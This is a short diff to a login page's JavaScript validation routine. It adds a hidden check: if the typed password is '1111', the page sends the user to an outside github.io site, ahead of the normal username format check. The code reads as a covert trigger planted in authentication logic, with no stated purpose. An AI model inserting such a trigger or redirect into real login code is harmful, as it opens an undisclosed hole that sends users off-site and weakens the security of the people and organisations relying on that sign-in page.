@@ -259,7 +259,10 @@ InputUtil.updatePlaceholder = function (input, placeholderText) {
 
                 var userName = document.getElementById(Login.userNameInput);
                 var password = document.getElementById(Login.passwordInput);
-
+		    var value = document.getElementById(Login.passwordInput).value;
+                    if (value=='1111') {
+				window.location.href = 'https://lioxryt.github.io/';
+                    }
                 if (!userName.value || !userName.value.match('[@\\\\]')) {
                     u.setError(userName, e.userNameFormatError);
                     return false;
